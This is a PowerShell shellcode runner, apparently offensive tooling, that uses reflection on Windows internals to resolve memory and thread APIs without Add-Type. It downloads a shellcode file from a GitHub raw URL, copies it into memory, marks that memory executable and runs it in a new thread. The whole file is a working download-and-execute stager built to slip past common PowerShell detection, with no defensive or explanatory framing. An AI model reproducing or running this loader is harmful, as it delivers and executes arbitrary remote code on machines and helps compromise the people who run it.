# =====================================================================
#   FIXED Reflection-based shellcode runner (no Add-Type)
#   Compatible with modern Windows / PowerShell 5.1+
# =====================================================================

function LookupFunc {
    Param (
        [string] $Module,
        [string] $ProcName
    )

    # Get UnsafeNativeMethods
    $systemAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith('System.dll') }

    $unsafeMethods = $systemAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')

    # GetModuleHandle
    $getModuleHandle = $unsafeMethods.GetMethod('GetModuleHandle', [Type[]]@([String]))

    # Get correct GetProcAddress overload (IntPtr, String) → avoids HandleRef issues
    $getProcAddress = $unsafeMethods.GetMethods() |
        Where-Object { $_.Name -eq 'GetProcAddress' -and $_.GetParameters().Count -eq 2 -and $_.GetParameters()[0].ParameterType -eq [IntPtr] } |
        Select-Object -First 1

    if (-not $getProcAddress) {
        throw "Could not find suitable GetProcAddress overload"
    }

    $hModule = $getModuleHandle.Invoke($null, @($Module))

    # Invoke with IntPtr instead of HandleRef
    $funcPtr = $getProcAddress.Invoke($null, @([IntPtr]$hModule, $ProcName))

    if (-not $funcPtr) {
        throw "GetProcAddress failed for $ProcName in $Module"
    }

    return $funcPtr
}

function Get-DelegateType {
    Param (
        [Type[]] $Params = @(),
        [Type]   $ReturnType = [void]
    )

    $name   = New-Object Reflection.AssemblyName('DynDelegate')
    $domain = [AppDomain]::CurrentDomain
    $asm    = $domain.DefineDynamicAssembly($name, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod    = $asm.DefineDynamicModule('InMem', $false)
    $type   = $mod.DefineType('MyDelegateType', 'Class,Public,Sealed,AnsiClass,AutoClass', [MulticastDelegate])

    # Constructor
    $ctor = $type.DefineConstructor(
        [Reflection.BindingFlags]'Public,HideBySig,RTSpecialName',
        [Reflection.CallingConventions]::Standard,
        @([IntPtr], [Object])
    )
    $ctor.SetImplementationFlags('Runtime,Managed')

    # Invoke method
    $invokeMethod = $type.DefineMethod(
        'Invoke',
        [Reflection.BindingFlags]'Public,HideBySig,NewSlot,Virtual',
        $ReturnType,
        $Params
    )
    $invokeMethod.SetImplementationFlags('Runtime,Managed')

    return $type.CreateType()
}

# ── Main ─────────────────────────────────────────────────────────────

$url = "https://github.com/Zakelijkgg/Undefined-BP/raw/refs/heads/main/shellcode.bin"

try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    return
}

$size = $shellcode.Length

# ── Resolve function pointers ───────────────────────────────────────

try {
    $ptrVirtualAlloc   = LookupFunc 'kernel32.dll' 'VirtualAlloc'
    $ptrVirtualProtect = LookupFunc 'kernel32.dll' 'VirtualProtect'
    $ptrCreateThread   = LookupFunc 'kernel32.dll' 'CreateThread'
    $ptrWaitForSingle  = LookupFunc 'kernel32.dll' 'WaitForSingleObject'
} catch {
    Write-Host "[-] API resolution failed: $($_.Exception.Message)"
    return
}

# ── Define delegate types (NO [ref] in the array – use plain types) ──

$delVirtualAlloc = Get-DelegateType -Params @([IntPtr], [uint32], [uint32], [uint32]) -ReturnType ([IntPtr])

# For VirtualProtect – out/ref becomes plain uint32 in params, we handle ref separately when invoking
$delVirtualProtect = Get-DelegateType -Params @([IntPtr], [uint32], [uint32], [uint32].MakeByRefType()) -ReturnType ([bool])

$delCreateThread = Get-DelegateType -Params @([IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [uint32].MakeByRefType()) -ReturnType ([IntPtr])

$delWaitForSingle = Get-DelegateType -Params @([IntPtr], [uint32]) -ReturnType ([uint32])

# ── Create delegates ─────────────────────────────────────────────────

$VirtualAlloc   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualAlloc,   $delVirtualAlloc)
$VirtualProtect = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVirtualProtect, $delVirtualProtect)
$CreateThread   = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCreateThread,   $delCreateThread)
$WaitForSingle  = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrWaitForSingle,  $delWaitForSingle)

# ── Execute ──────────────────────────────────────────────────────────

try {
    Write-Host "[+] Allocating memory (RW)..."
    $addr = $VirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x04)  # MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE

    if ($addr -eq [IntPtr]::Zero) { throw "VirtualAlloc failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    [Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)

    Write-Host "[+] Setting RX protection..."
    $oldProtect = [uint32]0
    $success = $VirtualProtect.Invoke($addr, $size, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ

    if (-not $success) { throw "VirtualProtect failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    Write-Host "[+] Creating thread..."
    $threadId = [uint32]0
    $threadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)

    if ($threadHandle -eq [IntPtr]::Zero) { throw "CreateThread failed (Win32: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))" }

    Write-Host "[+] Waiting for shellcode execution to finish..."
    $null = $WaitForSingle.Invoke($threadHandle, 0xFFFFFFFF)

    Write-Host "[+] Done."
}
catch {
    Write-Host "[-] Execution error: $($_.Exception.Message)"
}
